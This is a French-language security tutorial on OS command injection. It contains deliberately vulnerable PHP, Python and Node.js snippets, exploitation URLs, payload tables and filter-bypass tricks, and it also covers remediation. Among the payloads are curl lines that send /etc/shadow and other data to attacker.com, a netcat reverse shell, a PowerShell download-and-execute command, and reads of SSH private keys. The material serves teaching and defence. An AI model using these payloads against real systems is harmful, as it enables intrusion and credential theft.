# Command Injection

## 🔍 1. Qu’est-ce que le Command Injection ?

### 📌 Définition
Le **Command Injection** (ou **OS Command Injection**) est une vulnérabilité de sécurité qui permet à un attaquant d’exécuter **des commandes arbitraires sur le système d’exploitation** via une application vulnérable. L’application exécute ces commandes **avec les privilèges de l’utilisateur sous lequel elle tourne**.

> Exemple : Si une application web tourne sous l’utilisateur `www-data` (Linux) ou `IIS_IUSRS` (Windows), alors toute commande injectée sera exécutée avec ces droits.

### ⚠️ Pourquoi c’est grave ?
- C’est une forme de **Remote Code Execution (RCE)**.
- Permet de :
  - Lire/écrire/modifier des fichiers sensibles (`/etc/passwd`, `.env`, `config.php`)
  - Établir un **reverse shell**
  - Pivoter vers d’autres systèmes internes
  - Escalader les privilèges
- Classé dans le **Top 10 OWASP** depuis des années.

---

## 💡 2. Comment ça marche ? Le mécanisme

Les applications interagissent parfois avec le système d’exploitation via des fonctions comme :
- `system()` en PHP
- `subprocess.run()` en Python
- `child_process.exec()` en Node.js

Ces fonctions prennent souvent **une chaîne de caractères** comme entrée… et si cette chaîne contient **du code malveillant**, le système l’exécute.

### 🧩 Analogie simple
Imaginez un assistant vocal qui exécute ce que vous dites :
> “Cherche la chanson *Bohemian Rhapsody* dans ma bibliothèque.”

Mais si vous dites :
> “Cherche la chanson *Bohemian Rhapsody* ; supprime tous mes fichiers”

Et que l’assistant ne filtre pas le `;`, il fera **les deux**.

---

## 🧪 3. Exemples concrets de code vulnérable

### ✅ Exemple 1 : PHP (très courant)
```php
<?php
if (isset($_GET['title'])) {
    $title = $_GET['title'];
    $command = "grep '$title' songtitles.txt";
    echo "<pre>" . shell_exec($command) . "</pre>";
}
?>
```
#### 🔥 Exploitation :
URL :  
`http://site.com/search.php?title=Bohemian'; whoami; '`

→ La commande devient :
```bash
grep 'Bohemian'; whoami; '' songtitles.txt
```
→ `whoami` s’exécute → affiche `www-data`.

> Note : Le `'` ferme la chaîne, `;` sépare les commandes, `'` évite une erreur de syntaxe.

---

### ✅ Exemple 2 : Python (Flask + subprocess)
```python
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    result = subprocess.getoutput(cmd)
    return f"<pre>{result}</pre>"
```
#### 🔥 Exploitation :
`http://localhost:5000/exec?cmd=cat /etc/passwd`

→ Affiche le fichier `/etc/passwd`.

> ⚠️ `subprocess.getoutput()` exécute directement la commande fournie — **extrêmement dangereux**.

---

### ✅ Exemple 3 : Node.js
```javascript
const express = require('express');
const { exec } = require('child_process');
const app = express();

app.get('/ping', (req, res) => {
    const host = req.query.host;
    exec(`ping -c 3 ${host}`, (err, stdout) => {
        res.send(`<pre>${stdout}</pre>`);
    });
});
```
#### 🔥 Exploitation :
`http://localhost:3000/ping?host=8.8.8.8; id`

→ Exécute `ping -c 3 8.8.8.8; id` → affiche `uid=1001(node) gid=1001(node)`

---

## 👁️ 4. Types de Command Injection

### A. Verbose (ou "visible")
- **L’application renvoie le résultat** de la commande.
- Très facile à exploiter.
- Exemple : `whoami` → affiche `joe` sur la page web.

### B. Blind (ou "silencieux")
- **Aucun retour visible**.
- Il faut **inférer** l’exécution via :
  - **Délais** (`sleep 10`, `ping -c 10 127.0.0.1`)
  - **Effets secondaires** (création de fichiers, requêtes HTTP sortantes)

#### 🔍 Techniques de détection Blind :
1. **Time-based** :
   ```bash
   ; sleep 10 ;
   ```
   → Si la page met 10s à charger → vulnérabilité confirmée.

2. **Out-of-band (OOB)** :
   ```bash
   ; curl http://attacker.com/?leak=$(whoami) ;
   ```
   → Vérifiez les logs de votre serveur `attacker.com`.

3. **Redirection de sortie** :
   ```bash
   ; whoami > /var/www/html/output.txt ;
   ```
   → Puis accédez à `http://target.com/output.txt`

---

## 🛠️ 5. Payloads utiles (Linux & Windows)

### 🐧 Linux
| Payload | Objectif |
|--------|--------|
| `whoami` | Identité du processus |
| `id` | Infos utilisateur + groupes |
| `ls -la /` | Explorer le système |
| `cat /etc/passwd` | Liste des utilisateurs |
| `cat ~/.ssh/id_rsa` | Clé SSH privée |
| `nc -e /bin/sh 10.0.0.5 4444` | Reverse shell |
| `sleep 10` | Test blind |
| `curl http://attacker.com/exfil?data=$(cat /etc/shadow)` | Exfiltration |

### 🪟 Windows
| Payload | Objectif |
|--------|--------|
| `whoami` | Identité |
| `dir C:\` | Lister fichiers |
| `type C:\Users\Administrator\Desktop\flag.txt` | Lire un fichier |
| `ipconfig` | Infos réseau |
| `timeout /t 10` | Délai (équivalent de `sleep`) |
| `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"` | Shell PowerShell distant |

---

## 🛡️ 6. Comment se protéger ? (Remédiation)

### ❌ Ne JAMAIS faire :
- Concaténer directement l’entrée utilisateur dans une commande système.
- Utiliser `system()`, `exec()`, `shell_exec()`, `popen()`, etc. sans validation stricte.

### ✅ Bonnes pratiques :

#### 1. **Éviter les appels système si possible**
→ Utilisez des bibliothèques natives (ex: `os.listdir()` en Python au lieu de `ls`).

#### 2. **Validation stricte (whitelist)**
```php
// PHP : n'accepter que des lettres/chiffres
if (!preg_match('/^[a-zA-Z0-9 ]+$/', $title)) {
    die("Invalid input");
}
```

#### 3. **Échapper les arguments (mais attention !)**
```php
$cmd = "grep " . escapeshellarg($title) . " songtitles.txt";
```
> ⚠️ `escapeshellarg()` aide, mais **pas suffisant** si la logique est mal conçue.

#### 4. **Utiliser des APIs sécurisées**
En Python :
```python
# Sécurisé : liste blanche + arguments séparés
subprocess.run(["grep", title, "songtitles.txt"], capture_output=True)
```
→ Ici, `title` est traité comme **donnée**, pas comme **code**.

#### 5. **Principe du moindre privilège**
- Faites tourner l’appli sous un utilisateur **sans droits** (ex: `www-data`).
- Désactivez les shells (`/usr/sbin/nologin`).

#### 6. **Sandboxing / Conteneurs**
- Docker, Firejail, AppArmor → limiter les dégâts.

---

## 🕵️ 7. Contournement de filtres (Bypass)

Les développeurs filtrent souvent certains caractères :
- `;`, `&`, `|`, `$`, `` ` ``, `>`, `<`

Mais il existe des **bypass classiques** :

### 🔁 Encodage / Substitution
- `;` → `%3B` (URL encoding)
- `&&` → `%26%26`
- `|` → `\x7c` (hex)

### 🔄 Alternatives syntaxiques
| But | Payload alternatif |
|-----|-------------------|
| Séparer commandes | `;`, `&`, `&&`, `\n`, `\r\n` |
| Exécuter du code | `` `whoami` ``, `$(whoami)` |
| Contourner filtre "space" | `${IFS}`, `$' '` |

### Exemple avancé :
Filtre qui supprime `;` et `&` :
```bash
%0a id %0a
```
→ `%0a` = saut de ligne → exécute `id`.

Autre exemple :
```bash
{cat,/etc/passwd}
```
→ Fonctionne dans bash : équivalent à `cat /etc/passwd`.

---

## 📊 8. Statistiques & Contexte

- **OWASP Top 10** : A03:2021 – Injection (inclut Command Injection)
- **CWE-78** : OS Command Injection
- **CVSS** : Souvent **9.8/10** (critique)
- **Contrast Security (2019)** : #3 des vulnérabilités les plus fréquentes

---

## 🎯 9. Checklist pour pentester

✅ Tester chaque paramètre avec :
- `; whoami`
- `| id`
- `$(cat /etc/passwd)`
- `` `pwd` ``

✅ Si pas de sortie → tester en **blind** :
- `; sleep 10`
- `; curl your-server.com/$(hostname)`

✅ Essayer des bypass si filtres présents.

✅ Automatiser avec **Burp Suite**, **ffuf**, ou scripts Python.

✅ Toujours vérifier les **logs applicatifs** et **erreurs**.


